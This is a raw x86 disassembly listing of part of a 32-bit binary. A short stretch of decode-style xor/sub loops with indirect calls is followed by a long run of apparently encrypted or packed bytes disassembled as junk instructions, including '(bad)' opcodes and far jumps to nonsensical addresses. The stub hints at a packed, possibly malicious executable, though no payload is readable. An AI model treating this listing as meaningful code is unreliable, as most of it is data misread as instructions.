  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413c66
  413cce:	push   eax
  413ccf:	imul   edx,DWORD PTR [edx+ecx*4]
  413cd3:	jl     0x413d51
  413cd5:	inc    eax
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	and    ah,0xeb
  413cdc:	test   BYTE PTR [ebx+eiz*4+0x5c],dl
  413ce0:	ror    cl,0x49
  413ce3:	ins    BYTE PTR es:[edi],dx
  413ce4:	dec    esi
  413ce5:	pop    edx
  413ce6:	xor    eax,0x44ef6d69
  413ceb:	cdq    
  413cec:	or     ecx,eax
  413cee:	mov    WORD PTR [esi-0x429e866f],cs
  413cf4:	push   0xffffffa1
  413cf6:	xchg   ebx,eax
  413cf7:	nop
  413cf8:	add    BYTE PTR [edx],ah
  413cfa:	das    
  413cfb:	aad    0xb2
  413cfd:	pusha  
  413cfe:	xlat   BYTE PTR ds:[ebx]
  413cff:	and    eax,0x9048f0ef
  413d04:	fs scas eax,DWORD PTR es:[edi]
  413d06:	inc    ebx
  413d07:	loop   0x413d13
  413d09:	(bad)  
  413d0a:	fcomp  DWORD PTR [esi-0x44]
  413d0d:	or     BYTE PTR [ecx],ah
  413d0f:	iret   
  413d10:	mov    eax,0xba8deebd
  413d15:	push   ss
  413d16:	jne    0x413d0b
  413d18:	push   0xffffffc7
  413d1a:	xchg   edx,eax
  413d1b:	out    0xe3,eax
  413d1d:	mov    al,0x83
  413d1f:	jmp    0x8169:0x92cb9b11
  413d26:	psubd  mm1,QWORD PTR [ecx-0x13]
  413d2a:	inc    edi
  413d2b:	lds    edx,FWORD PTR [edi+0x1d2bfff3]
  413d31:	jne    0x413d44
  413d33:	leave  
  413d34:	sbb    al,0x5c
  413d36:	adc    DWORD PTR [esi],0xb6cfa135
  413d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d3d:	dec    esi
  413d3e:	in     eax,0xf4
  413d40:	retf   
  413d41:	gs test al,0x10
  413d44:	scas   eax,DWORD PTR es:[edi]
  413d45:	aas    
  413d46:	rol    DWORD PTR [eax],1
  413d48:	xchg   DWORD PTR [ecx-0x15],edi
  413d4b:	rcr    BYTE PTR [edi-0x58],1
  413d4e:	ds pop edi
  413d50:	add    ecx,0x55444d9d
  413d56:	mov    ch,0xf2
  413d58:	mov    cl,BYTE PTR [esi+0xe120912]
  413d5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d5f:	jl     0x413ced
  413d61:	fwait
  413d62:	sbb    dh,cl
  413d64:	mov    WORD PTR [ecx+0x5444ecd0],ss
  413d6a:	pop    edi
  413d6b:	aad    0x4f
  413d6d:	push   ss
  413d6e:	(bad)  
  413d70:	jo     0x413de3
  413d72:	dec    eax
  413d73:	daa    
  413d74:	inc    esp
  413d75:	mov    ebp,0x72c6026e
  413d7a:	out    dx,al
  413d7b:	push   ecx
  413d7c:	mov    eax,0x271485c9
  413d81:	mov    cl,0x2c
  413d83:	pop    ecx
  413d84:	jge    0x413dfe
  413d86:	pop    eax
  413d87:	sub    esp,DWORD PTR [ecx+0x25]
  413d8a:	and    esi,DWORD PTR [esi+0x5]
  413d8d:	shl    DWORD PTR [edi-0xaaa95c8],cl
  413d93:	mov    ecx,0x23db410c
  413d98:	cmp    BYTE PTR [esp+ebx*8],bh
  413d9b:	outs   dx,BYTE PTR ds:[esi]
  413d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d9d:	cli    
  413d9e:	ja     0x413d9e
  413da0:	inc    esi
  413da1:	ret    0xef1a
  413da4:	imul   esp,DWORD PTR [ebx+0x85f8ee4],0xf4efc35b
  413dae:	ins    BYTE PTR es:[edi],dx
  413daf:	inc    edi
  413db0:	fidiv  DWORD PTR [ebp-0x5e4dc2b5]
  413db6:	sbb    al,dh
  413db8:	cmp    eax,0x956889ff
  413dbd:	ins    DWORD PTR es:[edi],dx
  413dbe:	fisttp QWORD PTR [eax]
  413dc0:	sahf   
  413dc1:	push   ds
  413dc2:	inc    ecx
  413dc3:	mov    dh,0xde
  413dc5:	rcl    BYTE PTR [edx-0x58],0xde
  413dc9:	in     al,0xa8
  413dcb:	xchg   BYTE PTR [ebp+0x22],bh
  413dce:	pop    ebx
  413dcf:	xchg   esp,eax
  413dd0:	ins    DWORD PTR es:[edi],dx
  413dd1:	imul   esp,ebx,0xf5fcdc63
  413dd7:	pop    edi
  413dd8:	hlt    
  413dd9:	rcr    edi,1
  413ddb:	test   BYTE PTR [edx+0x5546069f],ch
  413de1:	inc    edi
  413de2:	push   0x37a46760
  413de7:	data16 stos BYTE PTR es:[edi],al
  413de9:	xor    al,0x94
  413deb:	mov    dl,0xb3
  413ded:	lds    edx,FWORD PTR [edx+0x59]
  413df0:	push   ebx
  413df1:	lock sbb BYTE PTR [ecx+esi*4+0x3eea260e],dh
  413df9:	ja     0x413e11
  413dfb:	push   ss
  413dfc:	loopne 0x413e44
  413dfe:	lea    ecx,ss:[ebp-0x1d]
  413e02:	call   0x707bd957
  413e07:	xchg   ecx,eax
  413e08:	cs add edi,edx
  413e0b:	pop    eax
  413e0c:	jb     0x413dea
  413e0e:	push   ss
  413e0f:	sbb    DWORD PTR [eax],edi
  413e11:	imul   ebx,DWORD PTR [ebx],0xe901872d
  413e17:	fst    DWORD PTR [ecx-0x63]
  413e1a:	mov    esi,0x46873085
  413e1f:	aam    0xf4
  413e21:	pop    ecx
  413e22:	cmp    eax,0x3872a7bd
  413e27:	fisttp QWORD PTR [ebp-0x1180deb6]
  413e2d:	mov    al,al
  413e2f:	mov    gs,WORD PTR [esi+edi*8+0x5b]
  413e33:	test   al,0xf4
  413e35:	and    DWORD PTR [eax+edx*1-0xa],ebp
  413e39:	neg    DWORD PTR [ecx+0x54]
  413e3c:	adc    BYTE PTR [ecx+0x2d2253fa],al
  413e42:	mul    DWORD PTR [edi]
  413e44:	push   esi
  413e45:	sub    al,0x2e
  413e47:	aaa    
  413e48:	ret    0x8836
  413e4b:	push   edi
  413e4c:	ins    DWORD PTR es:[edi],dx
  413e4d:	out    0x23,eax
  413e4f:	addr16 into 
  413e51:	xchg   esi,eax
  413e52:	xchg   DWORD PTR [ecx-0x49],edx
  413e55:	arpl   WORD PTR [ebp-0x6e42355],bp
  413e5b:	sub    al,0x2c
  413e5d:	dec    edi
  413e5e:	sub    BYTE PTR [ecx+0x2a9c6d38],0xbe
  413e65:	mov    esp,0xfc7672cf
  413e6a:	add    eax,0x5e044ab6
  413e6f:	pop    ecx
  413e70:	or     al,0x3a
  413e72:	retf   0xb8d5
  413e75:	mov    ah,0x62
  413e77:	fnstcw WORD PTR [edx-0x25]
  413e7a:	mov    ch,0x69
  413e7c:	mov    bl,0xd1
  413e7e:	dec    edi
  413e7f:	cwde   
  413e80:	sub    eax,0xc3e378ad
  413e85:	je     0x413e3a
  413e87:	repnz popa 
  413e89:	xor    ah,ah
  413e8b:	fdiv   st,st(7)
  413e8d:	(bad)  
  413e8e:	push   eax
  413e8f:	add    DWORD PTR [esi-0x4851d0d6],ecx
  413e95:	pop    ebp
  413e96:	aaa    
  413e97:	push   esp
  413e98:	jmp    0x413ec0
  413e9a:	cld    
  413e9b:	int    0x1e
  413e9d:	cmp    DWORD PTR [eax],ecx
  413e9f:	cmp    eax,0x7ac66434
  413ea4:	xlat   BYTE PTR ds:[ebx]
  413ea5:	sbb    BYTE PTR [esi+edx*4-0x7c0d322a],0x1d
  413ead:	or     DWORD PTR [ecx],esp
  413eaf:	sub    DWORD PTR [edx-0x639d1202],esi
  413eb5:	aaa    
  413eb6:	xor    al,0xfd
  413eb8:	mov    ch,0xa6
  413eba:	mov    BYTE PTR [edx-0x3f8131f5],bh
  413ec0:	jns    0x413f0e
  413ec2:	loope  0x413efa
  413ec4:	rcl    DWORD PTR [ebp-0x12],cl
  413ec7:	les    esp,FWORD PTR ds:0x449b038a
  413ecd:	pusha  
  413ece:	dec    esi
  413ecf:	mov    ebp,0x2ff013ac
  413ed4:	fist   DWORD PTR ds:0x254b50cf
  413eda:	push   es
  413edb:	pop    ds
  413edc:	fidiv  DWORD PTR [ebx-0x3be75acd]
  413ee2:	mov    bh,0xda
  413ee4:	cdq    
  413ee5:	imul   ecx,DWORD PTR [eax-0x49],0x55
  413ee9:	das    
  413eea:	inc    edi
  413eeb:	loop   0x413f40
  413eed:	out    0x43,al
  413eef:	sub    BYTE PTR [eax+0x465b62c4],0xe9
  413ef6:	mov    eax,0xe385f524
  413efb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413efc:	cmp    BYTE PTR [ecx+eax*1],dl
  413eff:	xor    ebp,DWORD PTR [esi-0x6a]
  413f02:	data16 arpl cx,ax
  413f05:	popf   
  413f06:	xchg   edi,eax
  413f07:	in     al,0x78
  413f09:	jne    0x413f18
  413f0b:	fdiv   st(5),st
  413f0d:	inc    ebx
  413f0e:	mov    esi,0x478026f6
  413f13:	loope  0x413ef5
  413f15:	sbb    eax,0xdd0cc867
  413f1a:	adc    al,0xac
  413f1c:	mul    DWORD PTR [edx+0x68227f79]
  413f22:	in     eax,0x87
  413f24:	xchg   esp,eax
  413f25:	loopne 0x413f52
  413f27:	mov    bh,ch
  413f29:	push   cs
  413f2a:	cmp    al,0x43
  413f2c:	int3   
  413f2d:	test   al,0xcd
  413f2f:	cmp    BYTE PTR [ecx+0x5918401],ah
  413f35:	cmp    dl,BYTE PTR [esi-0xe]
  413f38:	mov    ds:0xda2cceaa,eax
  413f3d:	cmp    bh,BYTE PTR [eax]
  413f3f:	xor    al,0xe7
  413f41:	stc    
  413f42:	leave  
  413f43:	pop    esi
  413f44:	sub    BYTE PTR [ecx-0x2c72f01e],dl
  413f4a:	pop    ds
  413f4b:	std    
  413f4c:	pop    es
  413f4d:	push   0xda6f3c8f
  413f52:	sbb    esi,edi
  413f54:	jb     0x413ef6
  413f56:	sbb    BYTE PTR [ebx],dl
  413f58:	sar    DWORD PTR [ecx+ecx*4-0x2aafbd8d],0x43
  413f60:	push   eax
  413f61:	popa   
  413f62:	sbb    DWORD PTR [edx+0x641a733e],ebx
  413f68:	in     al,dx
  413f69:	and    DWORD PTR [ecx+0x34363dcd],ecx
  413f6f:	sub    eax,0x48838b08
  413f74:	jmp    0x413f7d
  413f76:	pop    edi
  413f77:	push   edi
  413f78:	cmp    eax,0x7656ff36
  413f7d:	push   ds
  413f7e:	sahf   
  413f7f:	mov    dl,0x8f
  413f81:	pop    ebx
  413f82:	mov    ch,0xb2
  413f84:	pushf  
  413f85:	inc    ecx
  413f86:	lds    ecx,FWORD PTR [ebp-0x32]
  413f89:	int    0x3c
  413f8b:	mov    ?,ecx
  413f8d:	jmp    FWORD PTR [eax-0x4e579ccd]
  413f93:	imul   edi,ebp,0x61
  413f96:	push   esp
  413f97:	fdivr  st(6),st
  413f99:	mov    al,ds:0xce913ab
  413f9e:	pop    edi
  413f9f:	into   
  413fa0:	sub    al,0xb6
  413fa2:	fstp   TBYTE PTR [edx]
  413fa4:	out    dx,al
  413fa5:	adc    bh,BYTE PTR [eax*8-0xe1314]
  413fac:	xchg   esi,eax
  413fad:	sbb    ebp,ecx
  413faf:	pusha  
  413fb0:	test   eax,0x676d8edf
  413fb5:	push   0xe1ab0667
  413fba:	scas   al,BYTE PTR es:[edi]
  413fbb:	inc    ebp
  413fbc:	pusha  
  413fbd:	jge    0x413fe3
  413fbf:	cdq    
  413fc0:	push   ss
  413fc1:	(bad)  
  413fc3:	pop    edi
  413fc4:	xchg   esp,eax
  413fc5:	call   0x5512:0x2cdfa449
  413fcc:	push   cs
  413fcd:	outs   dx,BYTE PTR ds:[esi]
  413fce:	mov    dl,0xc
  413fd0:	call   0xc74f3afd
  413fd5:	out    dx,al
  413fd6:	sub    ax,sp
  413fd9:	aad    0x34
  413fdb:	lods   al,BYTE PTR ds:[esi]
  413fdc:	fst    QWORD PTR [eax+eiz*8]
  413fdf:	es loop 0x414004
  413fe2:	lock pop edx
  413fe4:	mov    WORD PTR [esi+0x30],cs
  413fe7:	mov    eax,ds:0x42682685
  413fec:	fwait
  413fed:	xchg   edi,eax
  413fee:	rcl    DWORD PTR [edi+0x6b9afca4],1
  413ff4:	scas   eax,DWORD PTR es:[edi]
  413ff5:	fmul   QWORD PTR ds:0x8fff4229
  413ffb:	dec    eax
  413ffc:	pxor   mm2,QWORD PTR [eax+0x76]
  414000:	xchg   esi,eax
  414001:	sub    dl,BYTE PTR [edi+0x2d571763]
  414007:	cli    
  414008:	mov    dl,0x91
  41400a:	rcl    DWORD PTR [edx],0x8c
  41400d:	(bad)  
  41400e:	cmc    
  41400f:	jmp    0x2ede:0xdfd71e59
  414016:	aam    0xb5
  414018:	jge    0x414077
  41401a:	pop    ds
  41401b:	iret   
  41401c:	ficom  DWORD PTR [ebx+0x5a5ecd62]
  414022:	jno    0x414014
  414024:	pop    eax
  414025:	xlat   BYTE PTR ds:[ebx]
  414026:	jg     0x414057
  414028:	nop
  414029:	ja     0x413ffc
  41402b:	mov    ebp,0x56d60994
  414030:	dec    edi
  414031:	push   eax
  414032:	jmp    0x49b7:0x6b7a78f5
  414039:	rol    bl,0xdd
  41403c:	jmp    0x413fda
  41403e:	cmp    al,0x1a
  414040:	dec    esp
  414041:	outs   dx,BYTE PTR ds:[esi]
  414042:	xor    BYTE PTR [eiz*8-0x1bb4addf],ch
  414049:	add    BYTE PTR ds:0x65332306,bh
  41404f:	mov    ds:0xb6ae6dc2,al
  414054:	fnstcw WORD PTR [eax+0x38cfb85d]
  41405a:	xor    cl,BYTE PTR es:[ebx+0x6b]
  41405e:	loopne 0x413fea
  414060:	aad    0x1f
  414062:	xchg   ecx,eax
  414063:	fsub   DWORD PTR [eax-0x27b09ebc]
  414069:	outs   dx,BYTE PTR ds:[esi]
  41406a:	lods   al,BYTE PTR ds:[esi]
  41406b:	iret   
  41406c:	jp     0x41407a
  41406e:	xchg   esi,eax
  41406f:	mov    dl,0xaf
  414071:	pop    ebx
  414072:	cmp    ebp,edx
  414074:	xchg   ebx,eax
  414075:	mov    ebp,0x561c86d9
  41407a:	xor    DWORD PTR [eax-0x60],ebp
  41407d:	mov    ebp,ebp
  41407f:	mov    dh,0x11
  414081:	(bad)
  414084:	adc    BYTE PTR [edx+0x30],0xcf
  414088:	das    
  414089:	out    dx,al
  41408a:	cli    
  41408b:	inc    edi
  41408c:	je     0x4140aa
  41408e:	adc    BYTE PTR [esi+0x60],ch
  414091:	mov    dh,0xed
  414093:	repz jecxz 0x4140e1
  414096:	or     edi,ecx
  414098:	sti    
  414099:	xchg   ebx,eax
  41409a:	mov    bh,0x6d
  41409c:	std    
  41409d:	mov    al,ds:0x2a77d8
  4140a2:	cld    
  4140a3:	ins    BYTE PTR es:[edi],dx
  4140a4:	and    eax,0x63e32b34
  4140a9:	lods   al,BYTE PTR ds:[esi]
  4140aa:	add    BYTE PTR [edi-0x3114cdb],dl
  4140b0:	xor    BYTE PTR [edi-0x7e],dl
  4140b3:	mov    esi,ebp
  4140b5:	mov    esi,0xb60b7271
  4140ba:	xchg   ecx,eax
  4140bb:	in     eax,dx
  4140bc:	pop    ebx
  4140bd:	jmp    0xdb4:0x79d5e5b3
  4140c4:	lods   al,BYTE PTR ds:[esi]
  4140c5:	add    al,0xcd
  4140c7:	inc    esp
  4140c8:	aad    0xf6
  4140ca:	rcl    dh,cl
  4140cc:	cmp    ah,0xff
  4140cf:	inc    esi
  4140d0:	push   esp
  4140d1:	xchg   ecx,eax
  4140d2:	int    0x9c
  4140d4:	adc    bh,cl
  4140d6:	cmp    eax,0x80174140
  4140db:	mov    esi,0x25675344
  4140e0:	add    eax,0xab7f567d
  4140e5:	mov    esi,0xe64184a1
  4140ea:	sub    bl,bl
  4140ec:	jecxz  0x41408a
  4140ee:	mov    dl,0xb4
  4140f0:	add    BYTE PTR [ecx],ch
  4140f2:	dec    eax
  4140f3:	xchg   esi,esp
  4140f5:	pop    ds
  4140f6:	mov    ch,0x93
  4140f8:	repnz lds dx,DWORD PTR [esi-0x19f58019]
  414100:	push   ebx
  414101:	sbb    eax,0x3181559f
  414106:	sbb    BYTE PTR [edi],0x7f
  414109:	(bad)  
  41410a:	adc    cl,bl
  41410c:	xor    ch,dh
  41410e:	pop    ss
  41410f:	stos   DWORD PTR es:[edi],eax
  414110:	sub    esp,ecx
  414112:	loopne 0x414120
  414114:	jmp    0x8ec7:0x8949d575
  41411b:	jmp    0x6a8eda95
  414120:	or     al,0x57
  414122:	pop    ecx
  414123:	cmp    eax,0x9d12b087
  414128:	shl    DWORD PTR [eax+ebp*4],cl
  41412b:	imul   edi,DWORD PTR [ebp-0x783c286f],0xffffffa9
  414132:	adc    al,dl
  414134:	sbb    dh,BYTE PTR [ebp-0x24239f88]
  41413a:	(bad)  
  41413b:	sub    DWORD PTR [edi-0x6c6d3bd],edx
  414141:	xor    eax,DWORD PTR [edx+0x4032178f]
  414147:	xchg   ecx,eax
  414148:	push   eax
  414149:	sbb    al,0x94
  41414b:	lods   al,BYTE PTR ds:[esi]
  41414c:	xchg   DWORD PTR [ebp+0x1a],ebp
  41414f:	add    ch,dh
  414151:	pusha  
  414152:	adc    ecx,eax
  414154:	jae    0x41418d
  414156:	pop    edi
  414157:	stos   DWORD PTR es:[edi],eax
  414158:	pop    edx
  414159:	and    DWORD PTR [edi+0x39],0xffffffb7
  41415d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41415e:	xor    BYTE PTR [ecx+ebp*8-0x7ac746d0],ch
  414165:	add    al,0x17
  414167:	hlt    
  414168:	cmp    eax,0xfde7028a
  41416d:	mov    BYTE PTR ds:0xd7837e69,ch
  414173:	inc    eax
  414174:	and    DWORD PTR [ebx-0x268d6703],0x648421a1
  41417e:	out    dx,eax
  41417f:	aas    
  414180:	sti    
  414181:	pop    ecx
  414182:	push   ds
  414183:	adc    DWORD PTR [ecx],ebx
  414185:	add    edi,ecx
  414187:	retf   
  414188:	xor    al,BYTE PTR [edx+0x12]
  41418b:	ja     0x414125
  41418d:	push   cs
  41418e:	mov    dh,0x85
  414190:	xchg   edi,eax
  414191:	data16 out dx,al
  414193:	outs   dx,BYTE PTR ds:[esi]
  414194:	pop    ebp
  414195:	add    eax,0x4278f1a1
  41419a:	sub    dh,cl
  41419c:	xchg   esp,eax
  41419d:	or     bl,ah
  41419f:	addr16 daa 
  4141a1:	mov    edi,0x27234ce6
  4141a6:	fwait
  4141a7:	ins    BYTE PTR es:[edi],dx
  4141a8:	xchg   ebx,eax
  4141a9:	(bad)  
  4141aa:	mov    esi,0x850f6e36
  4141af:	leave  
  4141b0:	add    DWORD PTR [ebp-0x5321f2f6],ebp
  4141b6:	mov    DWORD PTR ds:0xbc09158f,ebp
  4141bc:	xchg   esp,eax
  4141bd:	icebp  
  4141be:	push   eax
  4141bf:	iret   
  4141c0:	add    edi,DWORD PTR [ebp+0x52]
  4141c3:	jae    0x414178
  4141c5:	adc    eax,esi
  4141c7:	pop    es
  4141c8:	push   eax
  4141c9:	xor    al,0x20
  4141cb:	or     eax,0xaf962cfd
  4141d0:	push   es
  4141d1:	mov    edx,0x241063c1
  4141d6:	outs   dx,BYTE PTR ds:[esi]
  4141d7:	cmp    cl,ah
  4141d9:	xchg   BYTE PTR [ecx+0xe25cfc5],bh
  4141df:	xchg   ebx,eax
  4141e0:	mov    esp,0xa53d0a55
  4141e5:	mov    ch,0xd9
  4141e7:	or     BYTE PTR [edi+edi*2-0x39dbdcbd],0x85
  4141ef:	sub    dh,bh
  4141f1:	out    0xd4,al
  4141f3:	xchg   ebp,eax
  4141f4:	jbe    0x4141ca
  4141f6:	aad    0x4f
  4141f8:	clc    
  4141f9:	nop
  4141fa:	dec    edx
  4141fb:	int    0x10
  4141fd:	jne    0x414255
  4141ff:	lock loopne 0x41423c
  414202:	test   al,0x6
  414204:	jl     0x414268
  414206:	in     al,dx
  414207:	mov    ebx,0xac052614
  41420c:	xchg   ebp,eax
  41420d:	xchg   edi,eax
  41420e:	shl    DWORD PTR [edi+0x61],0x31
  414212:	add    eax,0x461a0295
  414217:	ficom  DWORD PTR [eax-0x1225b658]
  41421d:	sub    al,0xa
  41421f:	adc    edx,esp
  414221:	sub    ah,BYTE PTR [edx+eax*2+0x17]
  414225:	ret    
  414226:	mov    ds:0xff27b11f,eax
  41422b:	outs   dx,DWORD PTR ds:[esi]
  41422c:	in     eax,dx
  41422d:	fst    QWORD PTR [edi]
  41422f:	adc    bl,dl
  414231:	shl    DWORD PTR [edi],cl
  414233:	jae    0x41426c
  414235:	js     0x41421e
  414237:	(bad)  
  414238:	es rcl ah,cl
  41423b:	or     bh,BYTE PTR [eax-0x2e]
  41423e:	jns    0xf6cad684
  414244:	add    ebp,DWORD PTR [edx+0x5c1b1ea8]
  41424a:	stc    
  41424b:	test   ch,cl
  41424d:	retf   0x57e6
  414250:	jmp    DWORD PTR [esi-0x6dcca0d4]
  414256:	dec    ecx
  414257:	xchg   esp,eax
  414258:	dec    edi
  414259:	cs shufps xmm1,xmm5,0xed
  41425e:	retf   
  41425f:	add    DWORD PTR [eax+0x5c4dd8d4],0xe94da034
  414269:	sbb    BYTE PTR [ebx],ch
  41426b:	inc    eax
  41426c:	int3   
  41426d:	or     DWORD PTR [ebx+ebp*2-0x60836825],ebp
  414274:	jmp    0x1cbfffd2
  414279:	cmp    eax,0x94ff61e0
  41427e:	leave  
  41427f:	dec    ebp
  414280:	ror    BYTE PTR [edi+0x43],cl
  414283:	not    BYTE PTR [edx]
  414285:	dec    ecx
  414286:	or     cl,BYTE PTR [ecx]
  414288:	ins    BYTE PTR es:[edi],dx
  414289:	add    BYTE PTR [ebp+0x63],bl
  41428c:	cld    
  41428d:	not    edx
  41428f:	push   es
  414290:	int    0xf3
  414292:	pop    es
  414293:	dec    edi
  414294:	jmp    0x3e01a400
  414299:	dec    ecx
  41429a:	inc    ecx
  41429b:	jns    0x4142c8
  41429d:	mov    bh,0x8d
  41429f:	ret    0x5acb
  4142a2:	cmp    eax,0xab4e3a18
  4142a7:	bound  esp,QWORD PTR [esi-0x26ea2514]
  4142ad:	icebp  
  4142ae:	lods   eax,DWORD PTR ds:[esi]
  4142af:	iret   
  4142b0:	and    dh,BYTE PTR ds:0xf09164e2
  4142b6:	outs   dx,BYTE PTR ds:[esi]
  4142b7:	pop    edi
  4142b8:	adc    bh,al
  4142ba:	push   eax
  4142bb:	xchg   edi,eax
  4142bc:	icebp  
  4142bd:	fld    TBYTE PTR [eax+0x50]
  4142c0:	into   
  4142c1:	mov    ebx,0xce664653
  4142c6:	xchg   esi,eax
  4142c7:	lds    esi,FWORD PTR [ebp+0x518ffb59]
  4142cd:	mul    edi
  4142cf:	inc    esp
  4142d0:	adc    esp,ebp
  4142d2:	mov    ?,WORD PTR [eax-0x18f68b13]
  4142d8:	add    DWORD PTR [esi],ebx
  4142da:	sti    
  4142db:	fwait
  4142dc:	and    DWORD PTR ds:[ecx+edx*1-0xec1efe4],esi
  4142e4:	jb     0x4142d1
  4142e6:	pop    edi
  4142e7:	movzx  esi,BYTE PTR [esi]
  4142ea:	jle    0x4142fa
  4142ec:	pop    ebp
  4142ed:	xor    eax,DWORD PTR [eax-0x51]
  4142f0:	je     0xf3a9f40f
  4142f6:	and    ebx,esi
  4142f8:	and    eax,0x7fc3c089
  4142fd:	xchg   edx,eax
  4142fe:	mov    ds:0x447dc433,eax
  414303:	xchg   esp,eax
  414304:	shr    BYTE PTR [eax],1
  414306:	xchg   ecx,eax
  414307:	repz inc edx
  414309:	leave  
  41430a:	loopne 0x414340
  41430c:	pop    edx
  41430d:	mov    eax,ds:0xe209b597
  414312:	jle    0x4142bc
  414314:	jmp    0x41429a
  414316:	cmp    bl,BYTE PTR [ecx]
  414318:	outs   dx,BYTE PTR ds:[esi]
  414319:	adc    DWORD PTR [edi+0x1f66ec44],ecx
  41431f:	ds mov cl,0x7a
  414322:	(bad)  
  414323:	jno    0x41434a
  414325:	je     0x4142b1
  414327:	test   edx,esi
  414329:	leave  
  41432a:	fsubr  QWORD PTR [ecx]
  41432c:	call   0xd451:0xf215cb2f
  414333:	pop    ss
  414334:	mov    ds:0x9781670b,al
  414339:	nop
  41433a:	sbb    BYTE PTR [ecx+ebp*8+0x5f],al
  41433e:	sub    DWORD PTR [esi+0x4f86eeeb],edi
  414344:	push   eax
  414345:	into   
  414346:	and    ah,ch
  414348:	loope  0x414380
  41434a:	or     cl,BYTE PTR [eax+0x6d]
  41434d:	jp     0x41431d
  41434f:	cs stos BYTE PTR es:[edi],al
  414351:	icebp  
  414352:	add    al,0x45
  414354:	loope  0x4143b6
  414356:	and    dl,BYTE PTR [eax+edx*2+0x7bff3a82]
  41435d:	jmp    0xf60dd42a
  414362:	arpl   WORD PTR [eax-0x13],si
  414365:	or     al,0x8d
  414367:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414369:	scas   al,BYTE PTR es:[edi]
  41436a:	in     eax,0x29
  41436c:	jmp    0x8121:0x9a24a379
  414373:	add    edx,DWORD PTR [ebp+edx*1+0x4f2bdee8]
  41437a:	lods   al,BYTE PTR ds:[esi]
  41437b:	cli    
  41437c:	mov    DWORD PTR [edx+edx*1],ebx
  41437f:	mov    dh,0xee
  414381:	std    
  414382:	or     al,0xe8
  414384:	push   ss
  414385:	and    ch,BYTE PTR [eax+eiz*8]
  414388:	(bad)  
  414389:	daa    
  41438a:	sub    esi,DWORD PTR [eax]
  41438c:	clc    
  41438d:	les    ecx,FWORD PTR [edx+0x41]
  414390:	mov    dl,0x50
  414392:	mov    al,0xad
  414394:	add    edx,DWORD PTR ds:[esi]
  414397:	mov    ecx,0x3ba336d6
  41439c:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41439e:	das    
  41439f:	in     al,dx
  4143a0:	push   esp
  4143a1:	add    BYTE PTR [edx+0x7d],bl
  4143a4:	ins    BYTE PTR es:[edi],dx
  4143a5:	jne    0x4143d5
  4143a7:	cli    
  4143a8:	dec    eax
  4143a9:	and    BYTE PTR [edx],cl
  4143ab:	jl     0x41438d
  4143ad:	ins    DWORD PTR es:[edi],dx
  4143ae:	sbb    al,bl
  4143b0:	cmc    
  4143b1:	jno    0x41438d
  4143b3:	sub    ebp,DWORD PTR [ecx-0x5c2c2b3f]
  4143b9:	add    esp,edi
  4143bb:	in     al,0xc
  4143bd:	(bad)
  4143c2:	push   cs
  4143c3:	jecxz  0x414369
  4143c5:	ds enter 0x1fd6,0x54
  4143ca:	out    0x61,eax
  4143cc:	and    eax,DWORD PTR [eax-0x7a40fafb]
  4143d2:	fnsave ds:0x5a8dc958
  4143d8:	mov    ch,0xb7
  4143da:	jnp    0x41436e
  4143dc:	push   eax
